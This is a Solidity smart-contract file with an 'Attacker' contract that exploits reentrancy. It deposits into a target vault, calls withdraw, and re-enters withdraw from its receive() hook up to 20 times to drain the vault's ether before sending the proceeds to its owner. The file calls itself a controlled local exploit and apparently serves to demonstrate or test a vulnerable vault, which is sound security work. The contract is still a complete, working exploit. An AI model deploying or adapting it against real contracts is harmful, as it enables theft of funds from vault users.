// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

/// @title Attacker
/// @notice Controlled local exploit contract re-entering vault.withdraw()
contract Attacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public reentrancyCount;
    uint256 public constant MAX_REENTRANCY = 20;

    event AttackStarted(address indexed target, uint256 amount);
    event ReentrancyStep(uint256 indexed step, uint256 vaultRemaining);
    event AttackCompleted(uint256 totalExtracted, uint256 totalSteps);

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Initial deposit required");
        reentrancyCount = 0;
        emit AttackStarted(address(vault), msg.value);

        vault.deposit{value: msg.value}();
        vault.withdraw();

        emit AttackCompleted(address(this).balance, reentrancyCount);
    }

    receive() external payable {
        if (address(vault).balance >= msg.value && reentrancyCount < MAX_REENTRANCY) {
            reentrancyCount++;
            emit ReentrancyStep(reentrancyCount, address(vault).balance);
            vault.withdraw();
        }
    }

    function withdrawProceeds() external {
        require(msg.sender == owner, "Only owner");
        uint256 bal = address(this).balance;
        (bool success, ) = owner.call{value: bal}("");
        require(success, "Transfer failed");
    }
}
